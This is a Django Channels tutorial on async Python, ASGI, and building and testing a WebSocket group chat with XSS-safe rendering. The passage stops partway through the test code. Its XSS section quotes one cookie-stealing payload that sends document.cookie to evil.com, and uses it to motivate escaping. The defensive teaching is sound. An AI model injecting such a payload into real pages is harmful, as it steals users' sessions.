# Tutorial 07 — Async, ASGI and a WebSocket chat

**Goal:** understand why HTTP is not suitable for real time, how WebSocket solves this problem, what the asyncio event loop is, and how Django Channels implements the group chat in notes_chat_app.

---

## Contents

1. [Why HTTP doesn't work for chat](#why-http-doesnt-work-for-chat)
2. [WebSocket — a persistent two-way connection](#websocket--a-persistent-two-way-connection)
3. [asyncio — event loop and coroutines](#asyncio--event-loop-and-coroutines)
4. [Sync vs Async — where the difference is real](#sync-vs-async--where-the-difference-is-real)
5. [ASGI stack architecture](#asgi-stack-architecture)
6. [asgi.py — the entry point](#asgipy--the-entry-point)
7. [routing.py — WebSocket URL patterns](#routingpy--websocket-url-patterns)
8. [settings.py — Channel Layers and Daphne](#settingspy--channel-layers-and-daphne)
9. [Consumer — lifecycle and methods](#consumer--lifecycle-and-methods)
10. [database_sync_to_async — ORM in an async context](#database_sync_to_async--orm-in-an-async-context)
11. [Async ORM methods in Django 4.1+](#async-orm-methods-in-django-41)
12. [Channel layer — how it delivers to everyone](#channel-layer--how-it-delivers-to-everyone)
13. [InMemory vs Redis channel layer](#inmemory-vs-redis-channel-layer)
14. [Full implementation of GroupChatConsumer](#full-implementation-of-groupchatconsumer)
15. [WebSocket JS client](#websocket-js-client)
16. [XSS protection](#xss-protection)
17. [Testing consumers](#testing-consumers)
18. [Common mistakes](#common-mistakes)
19. [Practical task](#practical-task)
20. [Self-check checklist](#self-check-checklist)

---

## Why HTTP doesn't work for chat

HTTP is a "request → response → connection closed" protocol. The server **cannot** send a message to the browser without a request from the browser.

```
HTTP (classic):
  Browser ── GET /chat/ ──► Django view → HttpResponse → [connection closed]
  Browser ── GET /chat/ ──► Django view → HttpResponse → [connection closed]
  Browser ── GET /chat/ ──► Django view → HttpResponse → [connection closed]
  (a new connection each time — the server is silent between requests)
```

### Two workaround options for chat

| Approach | How it works | Problem |
|--------|-----------|----------|
| **Polling** | The browser requests `/new-messages/` every 2 seconds | 1000 users = 500 req/s. A message arrives with a delay of up to 2 sec |
| **Long polling** | The browser sends a request, the server keeps it open until a new message arrives | 1000 users = 1000 blocked threads |
| **Server-Sent Events** | A one-way stream from the server to the browser | Not two-way (the browser cannot send) |

### Sync Django + Long polling = a scaling problem

```
Sync Django thread pool:
  Typically: 4–16 worker threads (gunicorn/wsgi)
  
  1000 users in the chat → 1000 threads blocked waiting for a message
  Thread pool exhausted → the rest of the site (forms, notes, login) doesn't respond
  Each blocked thread: ~8 MB RAM for the stack → 1000 users = ~8 GB RAM just for threads
```

That is exactly why chat needs a fundamentally different approach: a persistent connection + async.

---

## WebSocket — a persistent two-way connection

A WebSocket is established through an HTTP Upgrade handshake **once**, after which the open TCP connection lives until the tab is closed.

### Handshake

```
1. Browser: GET /ws/groups/7/chat/ HTTP/1.1
            Upgrade: websocket
            Connection: Upgrade
            Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==

2. Server:  HTTP/1.1 101 Switching Protocols
            Upgrade: websocket
            Connection: Upgrade
            Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

3. After this — not HTTP but WebSocket frames (a binary protocol over TCP)
```

### Flow after the connection is established

```
WebSocket (after handshake):
  Browser ════════════ PERSISTENT TCP ════════════ Server
  ↑ Either side can send data at any moment

  Viktor: ws.send({content: "Hi!"}) ────────────► consumer.receive()
                                                          │
                                                     group_send()
                                                          │
          ws.onmessage ◄── consumer.send() ◄─────────────┤ Olya
          ws.onmessage ◄── consumer.send() ◄─────────────┤ Masha
          ws.onmessage ◄── consumer.send() ◄─────────────┘ Viktor
```

### The browser WebSocket API

```javascript
// Built into the browser — no libraries needed
const ws = new WebSocket('ws://localhost/ws/groups/7/chat/')

ws.onopen = () => {
    console.log('Connected to the chat')
}

ws.onmessage = (event) => {
    const data = JSON.parse(event.data)
    console.log('New message:', data)
}

ws.onclose = (event) => {
    // event.code:
    //   1000 — normal closure
    //   1006 — abnormal (the internet dropped)
    //   4003 — custom code (ours: not a member)
    console.log(`Connection closed: ${event.code}`)
}

ws.onerror = (error) => {
    console.error('WS error:', error)
}

ws.send(JSON.stringify({ content: 'Hi!' }))
ws.close()
```

---

## asyncio — event loop and coroutines

To understand Django Channels, you need to understand asyncio — Python's standard library for asynchronous programming.

### Event loop — the heart of async Python

```python
import asyncio

# Event loop — a "scheduler" of coroutines
# NOT parallel execution (not threading)
# Cooperative multitasking: tasks voluntarily yield via await

asyncio.run(main())
```

```
Event loop — one thread, many coroutines:

  ┌──────────────────────────────────────────────────────────┐
  │  Task 1: fetch(url_a) ──── await ──→ PAUSE               │
  │  Task 2: fetch(url_b) ──── await ──→ PAUSE               │
  │  Task 3: fetch(url_c) ──── await ──→ PAUSE               │
  │                                                           │
  │  I/O ready for Task 1 → RESUME Task 1                    │
  │  I/O ready for Task 3 → RESUME Task 3                    │
  │  I/O ready for Task 2 → RESUME Task 2                    │
  └──────────────────────────────────────────────────────────┘

  ≠ Threading (parallel execution in several OS threads)
  = Cooperative multitasking (one thread, switching via await)
```

### Coroutine vs a regular function

```python
# A regular function — runs to the end without stopping
def sync_fetch(url):
    response = requests.get(url)   # blocks the thread for the whole request
    return response.text

# A coroutine — can pause and yield to the event loop
async def async_fetch(url):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            return await response.text()  # here it yields to the event loop
```

### await — where the switching happens

```python
async def handler():
    # await = "start an async operation and yield to the event loop"
    result = await some_async_operation()
    
    # CPU code — the event loop does NOT switch here
    processed = process(result)
    
    return processed
```

### asyncio.gather — concurrent operations

```python
async def fetch_all():
    # Runs three tasks "at the same time" (concurrent, not parallel)
    results = await asyncio.gather(
        fetch(url_1),
        fetch(url_2),
        fetch(url_3),
    )
    # If each fetch takes 1 sec → ~1 sec in total (not 3)
    return results
```

---

## Sync vs Async — where the difference is real

### Comparing the models

| | Sync (WSGI/Gunicorn) | Async (ASGI/Uvicorn) |
|--|----------------------|----------------------|
| **Model** | Thread per request | Event loop + coroutines |
| **1000 connections** | 1000 OS threads (~8 GB RAM) | 1000 coroutines (~a few MB) |
| **CPU while there are no messages** | The thread is blocked and "sleeps" | The event loop serves others |
| **Code complexity** | Simpler (sync Python) | More complex (async/await everywhere) |
| **Risks** | Thread exhaustion | Blocking calls in an async context |

### Async is not always better

```
Sync Django: CRUD for notes, forms, authorization
  → sync fits perfectly
  → switching to async: complicates the code, gives nothing

Async Django Channels: 1000 concurrent WS connections in the chat
  → sync is impossible (thread exhaustion)
  → async is the only correct approach
```

**Rule:** async is justified for **long-lived connections** and **high-concurrency I/O**. For ordinary CRUD it is unnecessary complexity.

### What is async and what is sync in notes_chat_app

| Functionality | Implementation | Why |
|------------|-----------|------|
| Notes, Notebooks, Tags | Sync views | Simple CRUD, short requests |
| TodoList, ShoppingList | Sync views | Simple mutations |
| Authorization (login/register) | Sync views | Standard Django auth |
| Group chat | `AsyncWebsocketConsumer` | WS = thousands of long-lived connections |

---

## ASGI stack architecture

```
Browser (HTTP)          Browser (WebSocket)
      │                        │
      ▼                        ▼
   nginx :80  (reverse proxy — passes it on)
      │                        │
      ▼                        ▼
   Uvicorn ASGI :8001  (one process — both protocols)
      │
      ▼
   ProtocolTypeRouter  (notes_project/asgi.py)
      │
      ├── protocol == "http"
      │       ▼
      │   Django HTTP app (views.py, urls.py, templates)
      │
      └── protocol == "websocket"
              ▼
          AuthMiddlewareStack
              ▼
          WebSocket URLRouter  (notes_project/routing.py)
              ▼
          GroupChatConsumer  (notes_app/consumers.py)
              │
              ├──► PostgreSQL (via database_sync_to_async)
              └──► InMemoryChannelLayer / RedisChannelLayer (pub/sub)
```

| Component | Role | HTTP Django equivalent |
|-----------|------|---------------------|
| `ProtocolTypeRouter` | Distinguishes HTTP and WS by protocol type | `ROOT_URLCONF` |
| `AuthMiddlewareStack` | Reads the session cookie → `scope['user']` | `@login_required` decorator |
| `WebSocket URLRouter` | Routes the WS URL to a Consumer | `urls.py` |
| `GroupChatConsumer` | Handles the WS connection the whole time | `view` (but lives longer) |
| `InMemoryChannelLayer` | Pub/sub broadcast between consumers | _(no direct equivalent)_ |

---

## asgi.py — the entry point

```python
# notes_project/asgi.py
import os
from django.core.asgi import get_asgi_application
from channels.routing import ProtocolTypeRouter, URLRouter
from channels.auth import AuthMiddlewareStack

os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'notes_project.settings')

# CRITICAL: get_asgi_application() BEFORE any import from notes_app
# The Django app registry (AppConfig.ready()) must be initialized
# BEFORE importing models or consumers.
# If you swap the order → AppRegistryNotReady exception.
django_asgi_app = get_asgi_application()

# Only after get_asgi_application() is it safe to import from notes_app
from notes_project.routing import websocket_urlpatterns

application = ProtocolTypeRouter({
    # HTTP → regular Django (views.py, templates, static)
    "http": django_asgi_app,

    # WebSocket → Auth middleware → URL router → Consumer
    "websocket": AuthMiddlewareStack(
        URLRouter(websocket_urlpatterns)
    ),
})
```

### What AuthMiddlewareStack does

```
WebSocket handshake request:
  GET /ws/groups/7/chat/
  Cookie: sessionid=abc123xyz

AuthMiddlewareStack:
  1. Reads the sessionid cookie from the handshake headers
  2. Finds the session in the Django session backend (DB)
  3. Loads the User from the session
  4. Puts it into scope['user']

Consumer:
  self.user = self.scope['user']
  # → a User object (or AnonymousUser if not logged in)
```

---

## routing.py — WebSocket URL patterns

```python
# notes_project/routing.py
from django.urls import re_path
from notes_app import consumers

websocket_urlpatterns = [
    re_path(
        r'^ws/groups/(?P<group_pk>\d+)/chat/$',
        consumers.GroupChatConsumer.as_asgi(),
    ),
]

# URL: ws://host/ws/groups/7/chat/
# group_pk=7 → scope['url_route']['kwargs']['group_pk']
```

### re_path vs path for WebSocket

```python
# path() — simpler:
from django.urls import path
websocket_urlpatterns = [
    path('ws/groups/<int:group_pk>/chat/', consumers.GroupChatConsumer.as_asgi()),
]

# re_path() — regex, more control:
from django.urls import re_path
websocket_urlpatterns = [
    re_path(r'^ws/groups/(?P<group_pk>\d+)/chat/$', consumers.GroupChatConsumer.as_asgi()),
]

# Both options work.
# re_path is the traditional choice for WebSocket (more examples in the documentation)
```

---

## settings.py — Channel Layers and Daphne

```python
# notes_project/settings.py

INSTALLED_APPS = [
    'daphne',        # ← FIRST in the list! Must come before 'django.contrib.*'
    'channels',      # Django Channels
    'django.contrib.admin',
    # ... the rest of the apps
    'notes_app',
]

# ASGI application (instead of WSGI_APPLICATION for Channels)
ASGI_APPLICATION = 'notes_project.asgi.application'

# Channel Layer — chosen depending on the environment
_REDIS_URL = os.environ.get('REDIS_URL')

if _REDIS_URL:
    # Docker / Production: RedisChannelLayer
    CHANNEL_LAYERS = {
        "default": {
            "BACKEND": "channels_redis.core.RedisChannelLayer",
            "CONFIG": {
                "hosts": [{
                    "address": _REDIS_URL,
                    # socket_timeout=None — CRITICAL for idle WS connections
                    # Without it channels_redis sets socket_timeout=5
                    # and brpop_timeout=5 conflict → TimeoutError after idling
                    "socket_timeout": None,
                    "socket_connect_timeout": 5,
                    # Checks Redis every 30 sec — prevents a silent disconnect
                    "health_check_interval": 30,
                }],
            },
        }
    }
else:
    # Local dev (without Redis): InMemoryChannelLayer
    CHANNEL_LAYERS = {
        "default": {
            "BACKEND": "channels.layers.InMemoryChannelLayer",
        }
    }
```

### Why `daphne` comes first in INSTALLED_APPS

```python
# Without 'daphne' first:
$ python manage.py runserver
# → Django starts the built-in WSGI server
# → WebSocket doesn't work (WSGI doesn't support WS)

# With 'daphne' first:
$ python manage.py runserver
# → Daphne overrides runserver → starts an ASGI server
# → WebSocket works

# In production (Docker) we use uvicorn directly:
# exec python -m uvicorn notes_project.asgi:application --host 0.0.0.0 --port 8001
# → daphne first in INSTALLED_APPS is needed only for the local runserver
```

---

## Consumer — lifecycle and methods

A consumer is the equivalent of a view, but:
- It lives for the whole connection (not a single request)
- It runs as an async coroutine
- It handles events: connect, receive, disconnect, channel layer events

### ASCII lifecycle diagram

```
The browser opens the chat tab:
  ┌─────────────────────────────────────────────────┐
  │ 1. connect()                                     │
  │    ├── checks authorization (is_authenticated)  │
  │    ├── checks membership                         │
  │    ├── group_add() → subscribes to the channel   │
  │    ├── accept() → confirms the WS connection     │
  │    └── send() history × N messages               │
  │                                                   │
  │ 2. receive() ← the browser sent a message        │
  │    ├── validates content                          │
  │    ├── save_message() → PostgreSQL               │
  │    └── group_send() → broadcast to everyone      │
  │                 │                                 │
  │ 3. chat_message() ← the channel layer delivered  │
  │    └── send() → sends to the browser             │
  │                                                   │
  │    (2 and 3 repeat N times)                      │
  │                                                   │
  │ 4. disconnect()                                   │
  │    └── group_discard() → unsubscribes            │
  └─────────────────────────────────────────────────┘
```

### The difference between receive() and chat_message()

```
receive()      — the browser of THIS connection sent a message
chat_message() — the channel layer delivered a broadcast from any participant

When Olya sends "Hi":
  Olya's consumer:   receive() → group_send("chat_group_7", {...})
  Olya's consumer:   chat_message() ← channel layer → send() → Olya's browser
  Masha's consumer:  chat_message() ← channel layer → send() → Masha's browser
  Viktor's consumer: chat_message() ← channel layer → send() → Viktor's browser
```

---

## database_sync_to_async — ORM in an async context

The Django ORM is synchronous. Running sync code directly in an async context blocks the event loop and raises `SynchronousOnlyOperation`.

### How it works

```python
# ❌ WRONG — SynchronousOnlyOperation:
async def connect(self):
    group = Group.objects.get(pk=self.group_pk)
    # ↑ sync ORM in an async context → blocks the event loop → exception

# ✅ RIGHT — @database_sync_to_async:
@database_sync_to_async
def check_membership(self, group_pk, user):
    # A regular sync def
    # @database_sync_to_async runs it in the Django thread pool
    # The event loop is free while the thread executes the SQL
    try:
        group = Group.objects.get(pk=group_pk)
        return group.user_set.filter(pk=user.pk).exists()
    except Group.DoesNotExist:
        return False

async def connect(self):
    is_member = await self.check_membership(self.group_pk, self.user)
    # await = "run it in the thread pool and wait for the result without blocking the event loop"
```

### How it works under the hood

```
Event loop (one thread):
  coroutine connect() is running...
  
  → encounters: await self.check_membership(...)
  → @database_sync_to_async: Submit to the thread pool executor
  → Event loop: keeps serving OTHER connections
  
Thread pool (a separate thread):
  → runs the sync Django ORM query (SELECT ... FROM ...)
  → returns the result
  
Event loop:
  → receives the result from the thread pool
  → resumes the coroutine connect() from the next line
```

### Critical: return a list, not a QuerySet

```python
# ❌ WRONG — the QuerySet is lazy, it gets iterated in the async context:
@database_sync_to_async
def load_history(self, group_pk):
    return ChatMessage.objects.filter(group_id=group_pk).values(...)
    # The QuerySet hasn't executed the SQL! The SQL runs on iteration.
    # Iteration will happen in the async context → SynchronousOnlyOperation

# ✅ RIGHT — list() forces the SQL in the worker thread:
@database_sync_to_async
def load_history(self, group_pk):
    qs = (
        ChatMessage.objects
        .filter(group_id=group_pk)
        .select_related('author')
        .order_by('-timestamp')[:50]
    )
    messages = list(qs.values('id', 'author__username', 'content', 'timestamp'))
    # list() executes the SQL HERE, in the worker thread
    messages.reverse()  # chronological order
    return messages      # a Python list — safe to return
```

### database_sync_to_async as an inline wrapper

```python
# Option 1: decorator (most common)
@database_sync_to_async
def save_message(self, group_pk, user, content):
    return ChatMessage.objects.create(group_id=group_pk, author=user, content=content)

# Option 2: inline wrapper (for one-off operations)
async def receive(self, text_data):
    msg = await database_sync_to_async(ChatMessage.objects.create)(
        group_id=self.group_pk,
        author=self.user,
        content=content,
    )
```

---

## Async ORM methods in Django 4.1+

Django 4.1 added native async ORM methods. In async views they are more convenient than `database_sync_to_async`.

| Sync method | Async equivalent | What it does |
|------------|-------------|-----------|
| `qs.filter(...).first()` | `await qs.filter(...).afirst()` | The first result or None |
| `qs.get(pk=x)` | `await qs.aget(pk=x)` | One object or DoesNotExist |
| `qs.count()` | `await qs.acount()` | Number of rows |
| `Model.objects.create(...)` | `await Model.objects.acreate(...)` | Creating a record |
| `qs.update(...)` | `await qs.aupdate(...)` | Bulk update |
| `qs.delete()` | `await qs.adelete()` | Bulk delete |
| `obj.save()` | `await obj.asave()` | Saving an object |
| `obj.delete()` | `await obj.adelete()` | Deleting an object |
| `for obj in qs:` | `async for obj in qs:` | Iterating over a QuerySet |
| `qs.exists()` | `await qs.aexists()` | Whether there is at least one |

```python
# Async view — native async methods:
async def note_list(request):
    notes = [n async for n in Note.objects.filter(user=request.user).select_related('notebook')]
    return render(request, 'notes/list.html', {'notes': notes})

async def note_detail(request, pk):
    try:
        note = await Note.objects.aget(pk=pk, user=request.user)
    except Note.DoesNotExist:
        raise Http404
    return render(request, 'notes/detail.html', {'note': note})
```

**In a Consumer, use `@database_sync_to_async`** — it lets you run several ORM operations in a single thread pool call and gives better control over transactions.

---

## Channel layer — how it delivers to everyone

### The pub/sub concept

```
The channel layer is a message bus for Django Channels.
Each Consumer subscribes to a "group" (a named channel).
group_send() → delivers to ALL subscribers of the group.

State of the channel layer for the chat of group 7:
  Group "chat_group_7":
    ├── Viktor's consumer (channel_name: "specific.abc123")
    ├── Olya's consumer   (channel_name: "specific.def456")
    └── Masha's consumer  (channel_name: "specific.ghi789")
```

### group_send flow

```
Viktor sends "Hi":

1. Viktor's consumer: receive("Hi")
2. Viktor's consumer: group_send("chat_group_7", {
       'type': 'chat_message',
       'author': 'Viktor',
       'content': 'Hi',
       'timestamp': '2025-01-01T12:00:00',
   })

3. The channel layer finds the group "chat_group_7"
   → Viktor's consumer: chat_message(event) → send() → Viktor's browser
   → Olya's consumer:   chat_message(event) → send() → Olya's browser
   → Masha's consumer:  chat_message(event) → send() → Masha's browser

Result: "Hi" appears in all three browsers at the same time.
```

### type → method mapping

```python
# 'type' in group_send → the name of the method in the Consumer
# Dot → underscore:

group_send(room, {'type': 'chat_message', ...})  → Consumer.chat_message(event)
group_send(room, {'type': 'chat.message', ...})  → Consumer.chat_message(event)
group_send(room, {'type': 'user.joined', ...})   → Consumer.user_joined(event)
group_send(room, {'type': 'typing.indicator', ...}) → Consumer.typing_indicator(event)
```

---

## InMemory vs Redis channel layer

### InMemoryChannelLayer (dev)

```python
CHANNEL_LAYERS = {
    "default": {
        "BACKEND": "channels.layers.InMemoryChannelLayer",
    }
}
```

| Property | InMemory |
|-------------|----------|
| Dependencies | None (built into channels) |
| Scaling | Only one process |
| Persistence | Lost on restart |
| For | Local development, unit tests |

**InMemory limitation:** with several Uvicorn workers, each has its own InMemoryChannelLayer. Consumers in different workers don't see each other's messages.

### RedisChannelLayer (production)

```python
CHANNEL_LAYERS = {
    "default": {
        "BACKEND": "channels_redis.core.RedisChannelLayer",
        "CONFIG": {
            "hosts": [{
                "address": "redis://redis:6379/0",
                "socket_timeout": None,
                "socket_connect_timeout": 5,
                "health_check_interval": 30,
            }],
        },
    }
}
```

| Property | Redis |
|-------------|-------|
| Dependencies | A Redis server, the channels_redis package |
| Scaling | Unlimited (shared Redis between workers) |
| Persistence | Messages persist in Redis until delivered |
| For | Production, Docker Compose |

### Why socket_timeout=None

```
Problem:
  channels_redis by default: socket_timeout=5 (5 seconds)
  channels_redis uses Redis BRPOP with timeout=5
  
  With an idle WebSocket (nobody writes for > 5 sec):
    BRPOP timeout → channels_redis raises TimeoutError
    → the Consumer gets an exception → the WS connection closes
    → The user sees: "Connection lost"

Solution:
  socket_timeout=None → aioredis has no socket timeout
  BRPOP can wait indefinitely
  health_check_interval=30 keeps the connection alive (ping every 30 sec)
  nginx proxy_read_timeout=300s → nginx won't close the WS before 5 minutes
```

---

## Full implementation of GroupChatConsumer

```python
# notes_app/consumers.py
import json
from channels.generic.websocket import AsyncWebsocketConsumer
from channels.db import database_sync_to_async
from django.contrib.auth.models import Group


class GroupChatConsumer(AsyncWebsocketConsumer):
    """
    WebSocket consumer for the group chat.

    URL: /ws/groups/<group_pk>/chat/

    Client → Server:
        {"content": "Message text"}

    Server → Client (history):
        {"type": "history", "author": "...", "content": "...", "timestamp": "..."}

    Server → Client (live):
        {"type": "message", "author": "...", "content": "...", "timestamp": "..."}
    """

    async def connect(self):
        self.user = self.scope['user']

        # 1. Authorization
        if not self.user.is_authenticated:
            await self.close(code=4001)
            return

        # 2. group_pk from the URL kwargs
        self.group_pk = int(self.scope['url_route']['kwargs']['group_pk'])

        # 3. Membership check (ORM in a worker thread)
        is_member = await self.check_membership(self.group_pk, self.user)
        if not is_member:
            await self.close(code=4003)
            return

        # 4. Channel group name
        self.room_group_name = f"chat_group_{self.group_pk}"

        # 5. Subscribe to the channel group
        await self.channel_layer.group_add(
            self.room_group_name,
            self.channel_name,
        )

        # 6. Accept the connection
        await self.accept()

        # 7. Send the history
        history = await self.load_history(self.group_pk)
        for msg in history:
            await self.send(text_data=json.dumps({
                'type': 'history',
                'author': msg['author__username'],
                'content': msg['content'],
                'timestamp': msg['timestamp'].isoformat(),
            }))

    async def receive(self, text_data):
        try:
            data = json.loads(text_data)
        except json.JSONDecodeError:
            return

        content = data.get('content', '').strip()

        if not content:
            return
        if len(content) > 2000:
            await self.send(text_data=json.dumps({
                'type': 'error',
                'message': 'Повідомлення занадто довге (максимум 2000 символів)',
            }))
            return

        msg = await self.save_message(self.group_pk, self.user, content)

        await self.channel_layer.group_send(
            self.room_group_name,
            {
                'type': 'chat_message',
                'author': self.user.username,
                'content': content,
                'timestamp': msg.timestamp.isoformat(),
            }
        )

    async def chat_message(self, event):
        await self.send(text_data=json.dumps({
            'type': 'message',
            'author': event['author'],
            'content': event['content'],
            'timestamp': event['timestamp'],
        }))

    async def disconnect(self, close_code):
        # hasattr check: in case connect() finished before group_add
        if hasattr(self, 'room_group_name'):
            await self.channel_layer.group_discard(
                self.room_group_name,
                self.channel_name,
            )

    # ─── ORM helpers ─────────────────────────────────────────────────

    @database_sync_to_async
    def check_membership(self, group_pk, user):
        try:
            group = Group.objects.get(pk=group_pk)
            return group.user_set.filter(pk=user.pk).exists()
        except Group.DoesNotExist:
            return False

    @database_sync_to_async
    def load_history(self, group_pk):
        from notes_app.models import ChatMessage
        qs = (
            ChatMessage.objects
            .filter(group_id=group_pk)
            .select_related('author')
            .order_by('-timestamp')[:50]
        )
        messages = list(qs.values('id', 'author__username', 'content', 'timestamp'))
        messages.reverse()
        return messages

    @database_sync_to_async
    def save_message(self, group_pk, user, content):
        from notes_app.models import ChatMessage
        return ChatMessage.objects.create(
            group_id=group_pk,
            author=user,
            content=content,
        )
```

---

## WebSocket JS client

```javascript
// notes_app/static/notes_app/js/group_chat.js

document.addEventListener('DOMContentLoaded', function () {
    const container = document.getElementById('chat-container');
    const groupPk = container.dataset.groupPk;
    const messagesDiv = document.getElementById('chat-messages');
    const messageInput = document.getElementById('message-input');
    const sendButton = document.getElementById('send-button');

    // ws:// for HTTP, wss:// for HTTPS (ngrok)
    const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${wsProtocol}//${window.location.host}/ws/groups/${groupPk}/chat/`;

    let ws = null;
    let reconnectAttempts = 0;
    const MAX_RECONNECT = 5;

    function connect() {
        ws = new WebSocket(wsUrl);

        ws.onopen = function () {
            reconnectAttempts = 0;
            sendButton.disabled = false;
            updateStatus('connected', 'Підключено');
        };

        ws.onmessage = function (event) {
            const data = JSON.parse(event.data);
            if (data.type === 'history' || data.type === 'message') {
                addMessage(data);
            } else if (data.type === 'error') {
                showError(data.message);
            }
        };

        ws.onclose = function (event) {
            sendButton.disabled = true;

            // Custom close codes — don't reconnect
            if (event.code === 4001 || event.code === 4003) {
                updateStatus('error', 'Доступ заборонено');
                return;
            }

            if (reconnectAttempts < MAX_RECONNECT) {
                reconnectAttempts++;
                const delay = Math.min(1000 * reconnectAttempts, 5000);
                updateStatus('reconnecting', `Перепідключення (${reconnectAttempts}/${MAX_RECONNECT})...`);
                setTimeout(connect, delay);
            } else {
                updateStatus('error', 'Помилка підключення. Перезавантажте сторінку.');
            }
        };
    }

    function sendMessage() {
        const content = messageInput.value.trim();
        if (!content || !ws || ws.readyState !== WebSocket.OPEN) return;
        ws.send(JSON.stringify({ content: content }));
        messageInput.value = '';
        messageInput.focus();
    }

    sendButton.addEventListener('click', sendMessage);

    messageInput.addEventListener('keydown', function (e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            sendMessage();
        }
    });

    function addMessage(data) {
        const wrapper = document.createElement('div');
        wrapper.className = 'chat-message';
        // escapeHtml() — REQUIRED for XSS protection
        wrapper.innerHTML = `
            <span class="chat-author">${escapeHtml(data.author)}</span>
            <span class="chat-time">${formatTime(data.timestamp)}</span>
            <div class="chat-content">${escapeHtml(data.content)}</div>
        `;
        messagesDiv.appendChild(wrapper);
        messagesDiv.scrollTop = messagesDiv.scrollHeight;
    }

    function escapeHtml(text) {
        const div = document.createElement('div');
        div.appendChild(document.createTextNode(text));
        return div.innerHTML;
    }

    function formatTime(isoString) {
        return new Date(isoString).toLocaleTimeString('uk-UA', {
            hour: '2-digit', minute: '2-digit',
        });
    }

    function updateStatus(type, message) {
        const el = document.getElementById('connection-status');
        if (el) { el.textContent = message; el.className = `status-${type}`; }
    }

    function showError(message) {
        const el = document.createElement('div');
        el.className = 'alert alert-warning';
        el.textContent = message;
        messagesDiv.appendChild(el);
        setTimeout(() => el.remove(), 5000);
    }

    connect();
});
```

### The chat template

```html
{# notes_app/templates/notes_app/group_chat.html #}
{% extends "layouts/dashboard.html" %}
{% load static %}

{% block content %}
<div id="chat-container"
     data-group-pk="{{ group.pk }}"
     class="d-flex flex-column"
     style="height: 80vh;">

  <h2>{{ group.name }} — Чат</h2>

  <div id="connection-status" class="mb-2 text-muted small">Підключення...</div>

  <div id="chat-messages"
       class="flex-grow-1 overflow-auto border rounded p-3 mb-2 bg-light">
  </div>

  <div class="input-group">
    <input id="message-input"
           type="text"
           class="form-control"
           placeholder="Введіть повідомлення... (Enter — надіслати)"
           maxlength="2000">
    <button id="send-button" class="btn btn-primary" disabled>
      Надіслати
    </button>
  </div>
</div>
{% endblock %}

{% block extra_js %}
<script src="{% static 'notes_app/js/group_chat.js' %}"></script>
{% endblock %}
```

---

## XSS protection

The chat shows content from other users — a classic XSS attack point.

### The attack vector

```
The attacker sends into the chat:
  <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">

If the JS client inserts it via innerHTML without escaping:
  div.innerHTML = data.content  ← DANGEROUS

→ The browser parses the HTML → the img fails to load → onerror fires
→ fetch() sends the cookies to evil.com → sessions are stolen
```

### Three safe options

```javascript
// ✅ Method 1: textContent (text only, HTML is not parsed)
messageDiv.textContent = data.content

// ✅ Method 2: createTextNode
messageDiv.appendChild(document.createTextNode(data.content))

// ✅ Method 3: escapeHtml() before innerHTML (if you need HTML markup)
function escapeHtml(text) {
    const div = document.createElement('div')
    div.appendChild(document.createTextNode(text))
    return div.innerHTML
    // & → &amp;  < → &lt;  > → &gt;  " → &quot;
}
wrapper.innerHTML = `<strong>${escapeHtml(data.author)}</strong>: ${escapeHtml(data.content)}`
```

**In notes_chat_app** we use method 3 (`escapeHtml`) — we need HTML markup for the message (author, time, content in separate elements).

---

## Testing consumers

### Basic test structure

```python
# notes_app/tests/test_consumers.py
import json
from channels.testing import WebsocketCommunicator
from channels.db import database_sync_to_async
from django.contrib.auth.models import User, Group
from django.test import TransactionTestCase, override_settings

from notes_project.asgi import application

TEST_CHANNEL_LAYERS = {
    "default": {
        "BACKEND": "channels.layers.InMemoryChannelLayer",
    }
}


def _make_session_cookie(user):
    """Helper: creates a session cookie for the user."""
    from importlib import import_module
    from django.conf import settings

    engine = import_module(settings.SESSION_ENGINE)
    session = engine.SessionStore()
    if user:
        session[settings.AUTH_USER_SESSION_KEY] = user.pk
        session['_auth_user_backend'] = 'django.contrib.auth.backends.ModelBackend'
        session['_auth_user_hash'] = user.get_session_auth_hash()
    session.save()
    return session.session_key


@override_settings(CHANNEL_LAYERS=TEST_CHANNEL_LAYERS)
class GroupChatConsumerTest(TransactionTestCase):
    # TransactionTestCase, not TestCase:
    # WebsocketCommunicator opens a separate thread for the consumer.
    # TestCase wraps each test in a transaction — the consumer from another thread
    # doesn't see this uncommitted data → the setUp objects "disappear".
    # TransactionTestCase doesn't wrap in a transaction → the data is visible to all threads.

    def setUp(self):
        # setUp() is synchronous, even if the tests are async.
        # We make ORM calls directly: setUp() never runs
        # in an async context, so database_sync_to_async isn't needed.
        self.user = User.objects.create_user('testuser', password='testpass123')
        self.other_user = User.objects.create_user('otheruser', password='testpass123')
        self.group = Group.objects.create(name='Test Group')
        self.group.user_set.add(self.user)

    def _communicator(self, user=None, group_pk=None):
        session_key = _make_session_cookie(user)
        pk = group_pk if group_pk is not None else self.group.pk
        return WebsocketCommunicator(
            application,
            f"/ws/groups/{pk}/chat/",
            headers=[(b"cookie", f"sessionid={session_key}".encode())],
        )
```

!!! note "asyncSetUp() in Django 5.1+"
    Django 5.1 added `asyncSetUp()` and `asyncTearDown()` to `TransactionTestCase`.
    In Django 5.2+ you can write:
    ```python
    async def asyncSetUp(self):
        self.user = await User.objects.acreate_user('testuser', password='pass')
        self.group = await DjangoGroup.objects.acreate(name='Chat')
        await self.group.user_set.aadd(self.user)
    ```
    Both approaches are correct. **`notes_chat_app`** uses a synchronous `setUp()`
    — it is simpler and doesn't require `database_sync_to_async` in the initialization method.

### Test 1: a member can connect

```python
    async def test_member_can_connect(self):
        comm = self._communicator(user=self.user)
        connected, _ = await comm.connect()
        self.assertTrue(connected)
        await comm.disconnect()
```

### Test 2: the history is sent after connect

```python
    async def test_member_receives_history_on_connect(self):
        from notes_app.models import ChatMessage
        await database_sync_to_async(ChatMessage.objects.create)(
            group=self.group, author=self.user, content='Старе повідомлення',
        )

        comm = self._communicator(user=self.user)
        await comm.connect()

        response = await comm.receive_json_from()
        self.assertEqual(response['type'], 'history')
        self.assertEqual(response['content'], 'Старе повідомлення')

        await comm.disconnect()
```

### Test 3: a non-member is rejected

```python
    async def test_non_member_is_rejected(self):
        # other_user is NOT a member of the group
        comm = self._communicator(user=self.other_user)
        connected, _ = await comm.connect()
        self.assertFalse(connected)
